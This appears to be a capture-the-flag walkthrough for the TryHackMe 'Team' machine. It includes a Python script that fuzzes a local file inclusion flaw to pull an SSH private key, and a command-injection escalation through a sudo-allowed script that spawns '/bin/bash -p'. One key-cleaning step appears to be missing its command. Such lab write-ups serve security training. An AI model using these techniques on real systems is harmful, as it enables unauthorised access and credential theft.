> In this walkthrough, we compromise the TryHackMe **Team** machine by abusing exposed **FTP credentials**, discovering a hidden **development subdomain**, exploiting a **Local File Inclusion (LFI)** vulnerability to retrieve an **SSH private key**, escalating privileges to another user through a **command injection flaw in a sudo-allowed script**, and finally achieving **root access** by hijacking a **writable cron backup script**.

## Automating SSH Key Discovery

Directly reading `/home/dale/.ssh/id_rsa` did not work immediately, so I used a Python LFI fuzzing script to search common Linux paths.

```python
#!/usr/bin/env python3
import requests
from requests.exceptions import RequestException

TARGET = "http://dev.team.thm/script.php?page="
WORDLIST = "/usr/share/wordlists/SecLists/Fuzzing/LFI/Linux/LFI-gracefulsecurity-linux.txt"
MATCH = "BEGIN OPENSSH PRIVATE KEY"

def main():
    session = requests.Session()

    with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as f:
        for i, line in enumerate(f, 1):
            payload = line.strip()
            if not payload:
                continue

            url = TARGET + payload
            print(f"\r[-] Trying [{i}] {payload:<80}", end="", flush=True)

            try:
                response = session.get(url, timeout=5)
                if MATCH in response.text:
                    print(f"\n[+] MATCH FOUND: {url}")
                    print(response.text)
                    return
            except RequestException:
                continue

if __name__ == "__main__":
    main()
```

Make it executable:

```shell
chmod +x lfi2sshkey.py
./lfi2sshkey.py
```

![](getting_sshkey_for_dale.webp){: width="800" height="400" .shadow }

## Recovering the Private Key

Save the output into `key.txt`, then clean comment characters:

```shell

ssh-keygen -yf id_rsa
```

## Privilege Escalation → Gyles

Check sudo permissions:

```shell
sudo -l
```
{: .nolineno }

We can run:

```text
(gyles) NOPASSWD: /home/gyles/admin_checks
```

Inspect the script:

![](sudo_l_and_reading_admin_checks.webp){: width="800" height="400" .shadow }

```shell
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null
```
{: .nolineno }

The `$error` variable is **executed directly as a command**, resulting in **command injection**.

Exploit it:

```shell
sudo -u gyles /home/gyles/admin_checks
```
{: .nolineno }

Input:

```text
/bin/bash -p
```

![](privesc_to_gyles.webp){: width="800" height="400" .shadow }

Upgrade TTY:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
{: .nolineno }

Now we have a shell as **gyles**.
